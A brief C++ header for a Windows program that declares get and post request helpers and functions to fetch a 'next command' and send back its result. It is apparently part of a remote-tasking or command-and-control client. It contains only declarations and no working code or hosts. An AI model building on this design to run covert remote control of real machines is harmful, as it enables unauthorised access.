#ifndef COMMS_HPP
#define COMMS_HPP

#include <string>
#include <windows.h>
#include "../config/config.hpp"

std::string get(std::string fqdn, int port, std::string uri);

std::string post(std::string fqdn, int port, std::string uri, std::string data);

std::string getNextCommand(CONFIG config);

std::string sendCommandResult(CONFIG config, std::string result);

#endif